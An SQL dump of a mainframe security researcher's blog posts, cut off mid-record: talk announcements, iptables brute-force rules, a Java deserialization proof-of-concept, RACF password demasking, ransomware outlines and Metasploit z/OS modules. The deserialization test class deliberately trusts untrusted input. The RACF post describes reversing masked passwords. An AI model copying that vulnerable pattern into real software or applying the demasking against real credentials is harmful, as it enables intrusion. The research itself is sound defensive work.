INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1, 'Destination:  blackhat 2018', 'bigendiansmalls', '', 'Well – I’m pretty excited about this!\nblackhat 2018 Briefing – MAINFRAME [Z/OS] REVERSE ENGINEERING AND EXPLOIT DEVELOPMENT', 'Uncategorized', 'https://www.bigendiansmalls.com/destination-blackhat-2018/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2, 'Keynote presentation from SHARE Sacramento 2018', 'bigendiansmalls', '2018-03-13T16:35:23+00:00', 'Had a few people ask for the actual presentation, so here you are!\nSHARE 2018 Keynote PPTX (95 Mb)', 'Uncategorized', 'https://www.bigendiansmalls.com/keynote-presentation-from-share-sacramento-2018/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (3, 'I am a mainframer – Interview with Open Mainframe Project', 'bigendiansmalls', '', 'Interview – I am a mainframer', 'Mainframe, Security', 'https://www.bigendiansmalls.com/i-am-a-mainframer-interview-with-open-mainframe-project/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (4, 'RACF masking algorithm, unmasked', 'bigendiansmalls', '', 'I’d been asked a few times recently for the code that generates the ICHDEX01 RACF masking exit. If you recall, this was the pre-DES (and long pre-KDFAES) algorithm that RACF used to store its passwords.  (If you want more detail about this as the other algorithms, see my presentation from SHARE 2016)\nThe algorithm, through a series of shifts and XORs transforms the user’s 8 character password into the masked equivalent. Quick users will see that the algorithm does little to actually protect the passwords from reverse engineering as there is a 1:1 relationship with the input (plaintext) character in position X to its corresponding output masked character in the same position X.\nFor example, given algorithm mask(), the following examples hold true:\n\r\n\r\n		\r\n		\r\n			\nPLAIN    MASK\r\nA        D57C4C4C4C4C4C4C\r\nA1       D5D07C4C4C4C4C4C\r\nA12      D5D0D32C4C4C4C4C\r\nA123     D5D0D3821C4C4C4C\r\nA1234    D5D0D382B58C4C4C\r\nA12345   D5D0D382B524BC4C\r\nA123456  D5D0D382B52417EC\r\nA1234567 D5D0D382B5241746\r\n			\r\n				\r\n					\r\n				\r\n					123456789\r\n				\r\n						PLAIN    MASKA        D57C4C4C4C4C4C4CA1       D5D07C4C4C4C4C4CA12      D5D0D32C4C4C4C4CA123     D5D0D3821C4C4C4CA1234    D5D0D382B58C4C4CA12345   D5D0D382B524BC4CA123456  D5D0D382B52417ECA1234567 D5D0D382B5241746\r\n					\r\n				\r\n			\r\n		\r\n\r\n \nSo all we need do is encode via the algorithm each character until we have positions in the new mask matching the given mask.\nThe github repo below has both the encoder (ichdex01.py) and brute-forcer (masking_bf.py)\nMasking/Demasking python code\nEnjoy.', 'Uncategorized', 'https://www.bigendiansmalls.com/racf-masking-algorithm-unmasked/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (5, 'Evil Mainframe training is going abroad', 'bigendiansmalls', '', 'Watch this space.\nhttps://www.evilmainframe.com', 'Uncategorized', 'https://www.bigendiansmalls.com/evil-mainframe-training-is-going-abroad/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (6, 'CA World 2017', 'bigendiansmalls', '', 'If you’re going to #CAWORLD 2017 – Come see my Tech Talk, “Pervasive Encryption – Speed Round” to hear the basics & practicalities of IBM’s new Dataset Encryption.', 'Mainframe, Presentations, Security', 'https://www.bigendiansmalls.com/ca-world-2017/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (7, 'Mainframes, An Overlooked Cyber Attack Target: Part Two', 'bigendiansmalls', '2017-10-29T12:02:17+00:00', 'Part two of my interview on Mainframes as a Cyber Attack target\nMainframes, An Overlooked Cyber Attack Target: Part Two', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/mainframes-an-overlooked-cyber-attack-target-part-two/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (8, 'ArcticCon – Thawing the frame – slide video', 'bigendiansmalls', '2017-10-27T08:29:21+00:00', 'Enjoy – Thawing the frame from ArcticCon\nWatch the video (no audio) of the slides here:', 'Exploit Development, Mainframe, Presentations, Security, Slides', 'https://www.bigendiansmalls.com/arcticcon-slides/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (9, 'VIDEO – Z Ransomware – SHARE 2017-San Jose', 'bigendiansmalls', '2017-07-22T21:50:51+00:00', 'For anyone who missed my talk at SHARE 2017 – Ransomware on Z – Checkmate!\nHere it is in its entirety. Enjoy! Ransomware on Z – Checkmate!\nPlease note that these videos and all videos released by SHARE are copyrighted by SHARE and are licensed under a Creative Commons Attribution-NonCommercial-NoDerivs 3.0 license. http://creativecommons.org/licenses/by-nc-nd/3.0/ This means that you can use but not edit or create derivative works of/from this video. All credit for video and its distribution are from SHARE.', 'Cryptography, Exploit Development, Mainframe, Presentations, Security, Slides', 'https://www.bigendiansmalls.com/video-z-ransomware-share-2017-san-jose/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (10, 'Mainframes, An Overlooked Cyber Attack Target: Part One', 'bigendiansmalls', '', 'An interview I gave regarding the state of mainframe security. Pt. 1.\nMainframes, An Overlooked Cyber Attack Target: Part One', 'Uncategorized', 'https://www.bigendiansmalls.com/mainframes-an-overlooked-cyber-attack-target-part-one/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (11, 'New job – Doing what I love', 'bigendiansmalls', '2017-06-27T08:20:15+00:00', 'Well – the time has come to start doing what I love to do full time. I couldn’t be happier to announce that I’m working with RSM Partners, Ltd to help bring their amazing mainframe services, security & software business to North America. This is going to be a great challenge and a great opportunity. Super excited to work with all the amazingly talented people at RSM.\nRSM Appoints North America Director\nEnterprise Systems Media – RSM Partners announces new N. America Director', 'Other, Security, Uncategorized', 'https://www.bigendiansmalls.com/new-job-doing-what-i-love/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (12, 'Iptables brute force protection w/ nat', 'bigendiansmalls', '', 'Setting up a vm on top of linux which communicates via a TAP adapter (on the 10.1.1.x network), I wanted iptables to prevent brute forcing to both the host ports (here 22 for ssh) and ports forwarded to the vm (here 443) as they are exposed to the internet.  This little snippet does both by using iptables’ conntrack – simply more than 3 connections to either of those ports mentioned inside 60 seconds will lock that source IP out for 60 seconds.\nThe offending connections are marked in the nat table – prerouting chain, and checked (depending on whether forwarded or direct to host) in the filter table forward / input chains respectively.  Logging is optional, you may choose to just DROP them once you’re confident on your ruleset.\nHere’s a sample of the final ruleset I made:\n\r\n\r\n		\r\n		\r\n			iptables.rules\r\n			Shell\r\n			\r\n			\n*mangle\r\n:PREROUTING ACCEPT [14138:1459925]\r\n:INPUT ACCEPT [9963:618428]\r\n:FORWARD ACCEPT [4175:841497]\r\n:OUTPUT ACCEPT [8303:1284925]\r\n:POSTROUTING ACCEPT [12453:2124922]\r\nCOMMIT\r\n##\r\n##\r\n*filter\r\n:INPUT ACCEPT [0:0]\r\n:FORWARD ACCEPT [0:0]\r\n:OUTPUT ACCEPT [9184:1653115]\r\n:BFLOG - [0:0]\r\n:FWDLOG - [0:0]\r\n:INPLOG - [0:0]\r\n:OUTLOG - [0:0]\r\n##\r\n# input chain\r\n##\r\n-A INPUT -i lo -j ACCEPT\r\n-A INPUT -m connmark --mark 0x5 -j BFLOG\r\n-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT\r\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\r\n-A INPUT -j INPLOG\r\n##\r\n# forward chain\r\n##\r\n-A FORWARD -m connmark --mark 0x5 -j BFLOG\r\n-A FORWARD -s 10.1.1.2/32 -j ACCEPT\r\n-A FORWARD -d 10.1.1.2/32 -j ACCEPT\r\n-A FORWARD -j FWDLOG\r\n##\r\n# new chain to log brute force attempts\r\n##\r\n-A BFLOG -j LOG --log-prefix \"BFDROP:\" --log-level 6\r\n-A BFLOG -j DROP\r\n##\r\n# new chain to log forward attempts\r\n##\r\n-A FWDLOG -j LOG --log-prefix \"FWDDROP:\" --log-level 6\r\n-A FWDLOG -j DROP\r\n##\r\n# log not accepted input attempts\r\n##\r\n-A INPLOG -j LOG --log-prefix \"INPDROP:\" --log-level 6\r\n-A INPLOG -j DROP\r\nCOMMIT\r\n##\r\n##\r\n*nat\r\n:PREROUTING ACCEPT [2:128]\r\n:INPUT ACCEPT [2:128]\r\n:OUTPUT ACCEPT [37:2477]\r\n:POSTROUTING ACCEPT [33:1984]\r\n:ZNAT - [0:0]\r\n##\r\n# prerouting chain, nat table\r\n##\r\n-A PREROUTING -p tcp -m tcp --dport 443 -m conntrack --ctstate NEW -m recent --set --name VMPORT --mask 255.255.255.255 --rsource\r\n-A PREROUTING -p tcp -m tcp --dport 443 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 --name VMPORT --mask 255.255.255.255 --rsource -j CONNMARK --set-xmark 0x5/0xffffffff\r\n##\r\n-A PREROUTING -p tcp -m tcp --dport 22 -m conntrack --ctstate NEW -m recent --set --name SSH --mask 255.255.255.255 --rsource\r\n-A PREROUTING -p tcp -m tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 --name SSH --mask 255.255.255.255 --rsource -j CONNMARK --set-xmark 0x5/0xffffffff\r\n-A PREROUTING -j ZNAT\r\n##\r\n# postrouting for outbound nat/masquerade\r\n##\r\n-A POSTROUTING -o eth0 -j MASQUERADE\r\n##\r\n# table for inbound destination natting\r\n##\r\n-A ZNAT -p tcp -m tcp --dport 22 -j RETURN\r\n-A ZNAT -p tcp -j DNAT --to-destination 10.1.1.2\r\nCOMMIT\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475\r\n				\r\n						*mangle:PREROUTING ACCEPT [14138:1459925]:INPUT ACCEPT [9963:618428]:FORWARD ACCEPT [4175:841497]:OUTPUT ACCEPT [8303:1284925]:POSTROUTING ACCEPT [12453:2124922]COMMIT####*filter:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [9184:1653115]:BFLOG - [0:0]:FWDLOG - [0:0]:INPLOG - [0:0]:OUTLOG - [0:0]### input chain##-A INPUT -i lo -j ACCEPT-A INPUT -m connmark --mark 0x5 -j BFLOG-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT-A INPUT -j INPLOG### forward chain##-A FORWARD -m connmark --mark 0x5 -j BFLOG-A FORWARD -s 10.1.1.2/32 -j ACCEPT-A FORWARD -d 10.1.1.2/32 -j ACCEPT-A FORWARD -j FWDLOG### new chain to log brute force attempts##-A BFLOG -j LOG --log-prefix \"BFDROP:\" --log-level 6-A BFLOG -j DROP### new chain to log forward attempts##-A FWDLOG -j LOG --log-prefix \"FWDDROP:\" --log-level 6-A FWDLOG -j DROP### log not accepted input attempts##-A INPLOG -j LOG --log-prefix \"INPDROP:\" --log-level 6-A INPLOG -j DROPCOMMIT####*nat:PREROUTING ACCEPT [2:128]:INPUT ACCEPT [2:128]:OUTPUT ACCEPT [37:2477]:POSTROUTING ACCEPT [33:1984]:ZNAT - [0:0]### prerouting chain, nat table##-A PREROUTING -p tcp -m tcp --dport 443 -m conntrack --ctstate NEW -m recent --set --name VMPORT --mask 255.255.255.255 --rsource-A PREROUTING -p tcp -m tcp --dport 443 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 --name VMPORT --mask 255.255.255.255 --rsource -j CONNMARK --set-xmark 0x5/0xffffffff##-A PREROUTING -p tcp -m tcp --dport 22 -m conntrack --ctstate NEW -m recent --set --name SSH --mask 255.255.255.255 --rsource-A PREROUTING -p tcp -m tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 --name SSH --mask 255.255.255.255 --rsource -j CONNMARK --set-xmark 0x5/0xffffffff-A PREROUTING -j ZNAT### postrouting for outbound nat/masquerade##-A POSTROUTING -o eth0 -j MASQUERADE### table for inbound destination natting##-A ZNAT -p tcp -m tcp --dport 22 -j RETURN-A ZNAT -p tcp -j DNAT --to-destination 10.1.1.2COMMIT\r\n					\r\n				\r\n			\r\n		\r\n\r\n \nFor debugging, I cannot recommend highly enough using the TRACE target on the raw table (PREROUTING chain).\nSomething like:\n\r\n\r\n		\r\n		\r\n			trace target\r\n			Shell\r\n			\r\n			\niptables -I PREROUTING -t raw -p tcp --dport 22  -j TRACE\r\n			\r\n				\r\n					\r\n				\r\n					1\r\n				\r\n						iptables -I PREROUTING -t raw -p tcp --dport 22  -j TRACE\r\n					\r\n				\r\n			\r\n		\r\n\r\n \nWill show in your log, every stop along the iptables chains for every packet, including which rule or policy was acted upon it to get it to it’s final destination and shape.  Don’t forget to remove it when you’re done!\nAlso, install the actual conntrack utility to see the connection tracking tables.', 'Security, Tips', 'https://www.bigendiansmalls.com/iptables-brute-force-protection-w-nat/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (13, 'Metasploit, now with Privilege Escalation!', 'bigendiansmalls', '2017-04-11T16:35:47+00:00', 'Update:   The PR was accepted.  Update your Metasploit installation and have a look!\nVersion 1 of an APF privilege escalation (Requires Creds) of a metasploit module has been submitted for inclusion. This version has no bells or whistles.\nYou can view it here:\nPR# 8228 z/OS Privesc via authorized APF library write access', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/metasploit-now-with-privilege-escalation/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (14, 'SP4RKCON 2017 – Hacking mainframes for CICS and giggles', 'bigendiansmalls', '2017-04-02T07:56:47+00:00', 'Here’s the presentation I gave at sp4rkcon:\nHacking mainframe for CICS and giggles\n (PPTX ~43mb)', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/sp4rkcon-2017-hacking-mainframes-for-cics-and-giggles/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (15, 'SHARE2017 – Presentations', 'bigendiansmalls', '2017-03-13T11:01:25+00:00', 'SHARE 2017 Mainframe Pentesting\n\nSHARE 2017 Ransomware Mainframe Checkmate', 'Cryptography, Exploit Development, Mainframe, Reverse Engineering, Security', 'https://www.bigendiansmalls.com/share2017/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (16, 'RSA2017 – Presentation “It’s just a computer”', 'bigendiansmalls', '2017-02-20T09:11:51+00:00', '', 'Mainframe, Security, Tips', 'https://www.bigendiansmalls.com/its-just-a-computer/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (17, 'Who’s gonna run this thing?', 'bigendiansmalls', '2016-12-08T13:18:13+00:00', 'Not to be contrarian, but – well – let me be contrarian. Rant coming. TL;DR – there needs to be a free version of z/os & it’s siblings sooner than later, to not do this is to potentially starve the platform out of existence as we know it.\nI don’t think, for a moment, that when people (looking to learn) ask for a mainframe-in-the-cloud type experience, that they are asking for Linux One or Linux on Z, they want a z/OS-type platform on which to learn and play. Otherwise it’s just Ubuntu or SUSE, like I can run on my laptop. Except for anyone but the kernel developers and a few select others, most would never know the difference (outside of performance, perhaps). It’s certainly not the classic z/OS / VM / tpf / etc. experience that most mainframers talk about daily.\nAs for the other offerings, none are the same (or even really the same sport) as having your hands on a “real” z/OS (or z/VM, etc.) mainframe – the closest of which, for people not buying hardware, would be z/PDT – the System Z hypervisor that runs on Linux. By real, I mean a system on which one can provision storage, configure parmlibs, install software with SMP/E, develop load modules, configure platform software and tcp/ip and more: IPL the system, crash it, figure out how to build a stand alone dump; figure out how to read that dump, get the system up and running again; gen a system from scratch; install an upgrade with a serverpac and so on. If you don’t know what some of those things meant, good, that’s the point.\nUntil IBM figures out that they’re losing opportunities because of this, I fear the platform is going to get harder and harder to support and defend. Most (if not all) of the cloud – or public offerings on Z (again, not talking Linux) are for developers. Master the mainframe, z Systems cloud trial (RD&T for z “Test drive development tools”) etc.\nHerein lies the rub. Where will the next generation of Storage Engineers & System Programmers come from? Who will write the DFSMS/ACS routines, or write the assembler-based system exits? Who will wade through SMP/E reading hold data and figuring out how to fix or remove a wonky PTF that didn’t apply correctly or went PE? Who will configure the VTAM / 3270 applications and the intricate work tweaking TCP/IP net filter and ATTLS? Who is going to do the detailed capacity / performance analysis and tuning of the storage, wlm, cpus and so on? To say nothing of the gargantuan task of securing these beasts.\nThese are skills with theoretical backgrounds in many other disciplines, but the specifics and technical difficulties pertaining to using those skills on this platform are non-trivial. People need time, mentors and opportunity to learn it. That opportunity is nearly gone – or unrealistically appraised at this point.\nSure there are a few colleges which teach these skills, and the tried and true way of apprenticeship still works if you can get it, but how prevalent is that? Moreover, why would a fresh-out-of-school person take a chance on an OS/platform that they’ve never gotten to put their hands on? In today’s world, they can get a free/inexpensive version of every. single. OS. on. the. planet. for personal use (Microsoft & VMWare development and full evaluation versions, Linux is open source and free, as are the BSDs) – except for z/OS and it’s time-tested brethren. Why is that? How does that secrecy help generate buzz and the next generation of loyal mainframers?\nTo ask the fresh, talented, next generation of techies to go to work in a mainframe shop – or to go to a school to learn mainframe is asking them to take a gigantic leap of faith. They have the opportunity to be hands-on with 99.999% of the tech out there before they leave high school; but somehow, someone expects that they’ll self-select into becoming a z/OS sysprog? Why would they? Not having a clear track to this pipeline is the single biggest security issue and threat to this platform there is. Companies will hire the remaining few, then outsource, then divest – unless we (and IBM) start driving interest by making the platform (the whole platform, not just the development bits) available to anyone who wants to play with it.\nIt’s a huge opportunity missed, and I hope it changes soon. One of the hardest things to see is, after giving a talk at a non-mainframe centric conference, people who come and ask how they can get involved directly. You can’t. Unless you go to work or school somewhere special, or are willing to lay out several thousand out of your own pocket – you just have to admire it from afar. And that’s too bad, because it’s a kick butt OS and a super-challenging ecosystem that the unbelievably sharp new technologists would sink their teeth into. They’d eat it up. Many were programming from the time they could walk and computers just. make. sense. But this computer, with it’s super configurable and somewhat non-forgiving “you better know what you’re doing or how to figure it out” practices and protocols, requires time and a steep ramp-up period to become proficient. It has to start now.\nWhen you go to those job fairs, conferences, or just on the next marketing push – come up with a way to give away for free or cheap a copy of these OS’s that run on a hypervisor like zpdt for people to just play with, destroy, hack, but mostly learn. Will there be some negative consequences ? Maybe. But fear not, the rest of the OS providers who have gone before in this space have already figured that out, with a mix of bug bounties, licensing agreements and lawyers. But that’s a topic for a different post.', 'Hints, Humor, Mainframe, Security, Tips', 'https://www.bigendiansmalls.com/whos-gonna-run-this-thing/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (18, 'Is that ransomware on your mainframe?', 'bigendiansmalls', '2016-11-20T18:03:10+00:00', 'Next week at SHARE – San Jose, I’m giving a talk on ransomware on z/OS.  I’ve been asked multiple times if I thought ransomware could happen on Z, is it possible: Unequivocally yes.  Come see this talk and watch a live demonstration of how this might work.   If you are responsible for mainframe security, work for a company with a mainframe, or just want to better understand the landscape of this particularly insidious threat, don’t miss this talk.\nRansomware is a combination of 3 basic moving parts:\n\nA delivery mechanism (Phishing email, infected web page, malicious program).\n\nThis infects the user’s machine – allowing for sniffing of credentials and network traffic.  It can then upload a payload to the host system.\n\n\nFile cataloging and encrypting.\n\nJust what it sounds like – find files of interest, encrypt them in place, destroy the local copy of the key.\n\n\nSome type of Command & Control (or at least reporting) – centralized server.\n\nSome means of transferring the keys out to the bad guys. Also, a way for the affected users to connect and pay ransom. (This is not strictly required, but does have precedent.  Steps #1 & #2 can happen regardless of the system’s ability to ‘phone home’ ).\n\n\n\nWe will also look at how to attempt to mitigate this catastrophic event, as well as ideas about how to recover from it.  Items such as two-factor authentication, proper ICSF / RACF security controls, egress filtering and intrusion detection.', 'Cryptography, Exploit Development, Mainframe, Security, Tips, Uncategorized', 'https://www.bigendiansmalls.com/is-that-ransomware-on-your-mainframe/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (19, 'SHARE 2016 Atlanta – Presentation – Mainframe exploits', 'bigendiansmalls', '2016-10-05T21:13:13+00:00', 'This is a co-presentation I did with Brian Marshall and Mark Wilson.\nMy slides are the last few, where I demonstrate 3 distinct exploits on the mainframe.  First, off-the-shelf Java with Jboss.  Second, TN3270 SSL MITM (using SETn3270 – thx to @mainframed767) and then use the stolen creds in a mainframe Metasploit module to get a shell.   And third, the final stages of what was a malicious SMP/E payload – demonstrated by an IPL that has an already inserted malicious SMF exit module installed (IEFU29).\nHope you enjoy it! PS – The animated GIFs that show the actual demonstrations don’t work in the deck via slideshare, so I’ve posted them separately below.\n \n 2016 share the three headed beast v4  from bigendiansmalls', 'Uncategorized', 'https://www.bigendiansmalls.com/share-2016-atlanta-presentation-mainframe-exploits/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (20, 'Updated JCL in Metasploit Functionality', 'bigendiansmalls', '', 'Recently updated my work in Metasploit to allow for editing of the JCL JOB card, in PR7221.\nWhat this means for you senior and aspiring z/OS pentesters, is that you can tailor JCL you submit with valid CLASS,MSGCLASS,NOTIFY,ACCOUNTING etc.\nThis will allow for more success running jobs on different systems and, out of the box, it is set with defaults that will run quiet on most systems.\nNext MSF project is a TN3270 layer, which will allow for scripted information gathering and attacks on systems – using the TN3270/TSO interface.', 'Uncategorized', 'https://www.bigendiansmalls.com/updated-jcl-in-metasploit-functionality/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (21, '', 'bigendiansmalls', '', 'Follow up to \"Smashing the DSA Chain\". from      mainframe    \n    \nAnother impeccable write-up by @_ciq', 'Exploit Development, Mainframe, Reverse Engineering, Security, Tips', 'https://www.bigendiansmalls.com/return-oriented-mainframe-exploits/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (22, 'Mainframes – Java – Deserialization', 'bigendiansmalls', '2016-07-14T10:12:31+00:00', 'I was asked a week or so ago whether or not I thought z/OS would be susceptible to the types of Java deserialization attacks we’ve seen (a great primer from Fox Glove Security).   Of course!, I replied.  However, I don’t like unsubstantiated claims – so I built this POC:\n\nIt uses the basic ysoserial payload generator found on Github.   The SerialTestPlain.java file I use to test is from a blog here:\nThe source is simple:\r\n\r\n		\r\n		\r\n			Simple Serialization Test\r\n			\r\n			\r\n			\nimport java.io.ObjectInputStream;\r\nimport java.io.ByteArrayInputStream;\r\nimport java.nio.file.Files;\r\nimport java.nio.file.Path;\r\nimport java.nio.file.Paths;\r\nimport java.io.InputStream;\r\nimport org.apache.commons.collections.*;\r\n\r\npublic class SerialTestPlain{\r\n  public static void main(String args[]) throws Exception{\r\n    Bag bag = new HashBag();\r\n    Path path = Paths.get(args[0]);\r\n    byte[] data = Files.readAllBytes(path);\r\n    InputStream d = new ByteArrayInputStream(data);\r\n    ObjectInputStream ois = new ObjectInputStream(d);\r\n    ois.readObject();\r\n  }\r\n}\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718\r\n				\r\n						import java.io.ObjectInputStream;import java.io.ByteArrayInputStream;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.io.InputStream;import org.apache.commons.collections.*; public class SerialTestPlain{  public static void main(String args[]) throws Exception{    Bag bag = new HashBag();    Path path = Paths.get(args[0]);    byte[] data = Files.readAllBytes(path);    InputStream d = new ByteArrayInputStream(data);    ObjectInputStream ois = new ObjectInputStream(d);    ois.readObject();  }}\r\n					\r\n				\r\n			\r\n		\r\n\r\nSimple enough right?    Java on the mainframe is basically Java anywhere.  The only major gotcha (which should come as no surprise to anyone) are with issues of character translation  EBCDIC<->ASCII.   In this case, the ysoserial jarfile I built on x86 and just binary copied it to OMVS and that worked out of the box.\nOther times I’ve had to use an a2e / e2a custom decoder – just depends on the implementation.  Currently working to test the JBoss exploits and modify them, if need be, in MSF for z/OS.  More as that unfolds!\nNOTES:\nWhile testing this POC first on x86, I kept running into an error like this:\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\nException in thread \"main\" java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet\r\n at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:81)\r\n			\r\n				\r\n					\r\n				\r\n					12\r\n				\r\n						Exception in thread \"main\" java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:81)\r\n					\r\n				\r\n			\r\n		\r\n\r\nThe above mentioned blog helped – Basically Java 1.8u72 (since last December) needs to have the most current version of ysoserial, and use the CommonsCollections5 in order to work (and it does).   Prior versions of Java work just fine with the Release Version (0.04) of ysoserial.\nAlso, aside from fixes that are library based (like the Adobe Commons Collections one used here), most fixes to this bug have to happen in customized code, often written by organizations.   That makes this vulnerability particularly ugly and potentially difficult to mitigate.', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/mainframes-java-deserialization/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (23, 'Things I’ve Learned (and things to come)', 'bigendiansmalls', '2016-06-16T22:48:34+00:00', 'I started writing a list of topics I’ve learned, some in excruciating detail, some just enough to know where to look for further details (trust me, that is no small feat).\nI’m writing this not only as a way of keeping me honest on those days when nothing goes right, but also as a way to incentivize those among you who, like myself, have an insatiable desire to learn – and the tenacity to “figure it out.”\nIn most organizations, the below is accomplished by teams of people.   Some of the items (gen’ing a system from scratch, for instance – or setting up SMP/E, SMS, etc. from scratch – might never be a part of even a very senior mainframer’s repertoire).  I wanted to see what it would take to go it alone.\nMy plan is to build this page out with good links to relevant data – and/or if I get really ambitious build some how-tos on the finer points, if there is interest.  Real language how and wherefores.\nTHINGS I’VE LEARNED  (since I started a deep technical dive into mainframes)\n\nRACF\n\npassword construction / algorithms\nuser profile management\nusing callable services\nTSO commands for many common elements\nbuilding certificates\nimporting certificates\nuser certificates\n\n\nStorage Management\n\nConfiguring SMS from scratch\nInitializing devices\nusing DFDSS to move, backup and restore files\nusing IDCAMS for catalog and VSAM file management\nwhat the eff a VSAM file is\nhow to allocate datasets\ndifferent access methods (qsam, bdam, etc)\nwhat the hell a cylinder (or track) is\nHow big a mod 3,9,27,54 EAV are\nInitializing volumes\nlabeling and initializing tapes\ntroubleshooting space abends (D37,B37,E37)\n\n\nSystem Programming\n\nSMP/E updates, installation, management\nBuilding jcl from scratch\nConfigruing IPL parms, parmlibs, and startup shutdown procs from scratch\nchecking system resources\nHow apf authorization works\nbuilding a lnklist\nbuilding an lpalib\nbuilding a multi-tier catalog system\ntaking SVC dumps\nGetting a trace of a component\nreading said trace\nusing IPCS\ntroubleshooting failed ipls\n\n\nz/OS crypto\n\nkeychain management\nkey management\npassword configuration\n\n\nAssembler Programming\n\nWhat a load module is\nWhat a program module is\nhow to disassemble them\nwriting assembly\nusing 4 different debuggers\npatching programs the hard way\nbuilding a ZAP\nUsing Macros\nCompiling, Linking\nCallable service usage\nWhat the hell Language Environment is\n\n\nSDSF\n\nJes2 job management\nReading a job log\nmanaging output\nmanaging active jobs\nreconfiguring SDSF screens\n\n\nJES2\n\nNJE\nJob management\nConfiguration files\nparmlib entries\n\n\nTCP/IP\n\nTN3270 configuration\nFTP configuration\nFTP/S configuration\nTN3270 + ssl configuration\nPolicy Agent configuration\nTSO / USS tcp/ip commands\n\n\nOMVS/USS\n\ncreating zfs filesystems\ndbx debugger\ncompiling and linking with xlc\nWhat the hell Language Environment is\n\n\nz/OS operations\n\nMany console commands (devices, stg)\nHow to research a WTOR\nVtam commands\ntcpip commands\ndevice commands\n\n\nISPF\n\nPanel customization\nDDLIST wizardry\nEditor fine-tuning\nKeylist modification\nusing the editor – line & main command sets\n\n\n\nTHINGS LEFT TO LEARN\n\nVTAM\nREXX\nmemory areas and control blocks in depth\nSo much more (work in progress)\nSMF\nz/OMSF\npolicy agent\nATTLS (in depth)\nCoding Exits\nHardware configuration\nCross memory operations (PC, SRB, etc)\nmuch more', 'Hints, Other, Security, Tips, Uncategorized', 'https://www.bigendiansmalls.com/things-ive-learned-and-things-to-come/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (24, 'A logical first step', 'bigendiansmalls', '2016-05-16T08:41:22+00:00', 'The first z/OS exploit module in the Metasploit Framework, landed last Friday.\nThis is an exploit which takes advantage of a default or poorly configured FTP server. And, it requires valid credentials.  However, given this (and it’s a very common configuration), you will be presented with a very nice Unix shell – allowing for deeper testing of the system.\nThis is how it begins:  attackers look for low hanging fruit. The evolution of pentesting tools for the mainframe has to start somewhere, and this is the first concrete milestone in what has been an ongoing journey. Many x86 exploits are simply taking advantage of default configurations or poorly written code. z/OS is no different – it can suffer from neglected configurations and defaults like all other OS’s. So, that’s where I started. From here, we’ll build on default configuration exploits and work up and on through binary / code exploitation. Baby steps.\nAt any rate – I’m very proud of how this turned out. Thanks to 